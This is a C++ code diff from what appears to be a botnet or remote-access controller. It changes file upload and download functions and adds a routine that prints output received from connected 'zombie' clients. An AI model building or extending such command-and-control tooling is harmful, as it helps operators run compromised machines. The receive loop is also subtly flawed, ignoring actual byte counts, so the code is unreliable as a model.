@@ -128,7 +128,7 @@ void SetColor(int value)
 	- Numbers after 15 are background colors -
 	*/
 }
-void Transfer::uploadToClient(Server* serv1, const std::string filename)
+void Transfer::uploadToClient(Server* serv1,SOCKET cl_sock, const std::string filename)
 {
 	std::cout << "[*] Starting the upload of : " << filename << std::endl;
 	char buffer[BUFFER_LEN] = { 0 };
@@ -184,10 +184,9 @@ void Transfer::uploadToClient(Server* serv1, const std::string filename)
 		std::cout << "[*] Error can\'t open file : " << filename << std::endl;
 	}
 }
-void Transfer::downloadFromClient(Server* serv1, const std::string filename)
+void Transfer::downloadFromClient(Server* serv1,SOCKET cl_sock, const std::string filename)
 {	
 	char buffer[BUFFER_LEN] = { 0 };
-	SOCKET cl_sock = serv1->getDefaultClient().sock;
 
 	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE
 	const unsigned int size = atoi(buffer);
@@ -253,4 +252,32 @@ int Transfer::getSize(std::string filename)
 	else
 		return 0;
 
+}
+
+void Transfer::recvString(SOCKET cl_sock,const unsigned short nb)
+{
+	char size_ch[256] = { 0 };
+	recv(cl_sock, size_ch, sizeof(size_ch), 0);
+	int size = atoi(size_ch);
+	int current_size = 0;
+	int rest = size % BUFFER_LEN;
+	char buffer[BUFFER_LEN] = { 0 };
+	print_status("Zombie " + std::to_string(nb)+" :\n");
+
+	while (current_size != size)
+	{
+		if (current_size + rest == size)
+		{
+			current_size += rest;
+		}
+		else
+		{
+			
+			current_size += BUFFER_LEN;
+
+		}
+		recv(cl_sock, buffer, BUFFER_LEN, 0);
+		print_status(buffer);
+	}
+	
 }
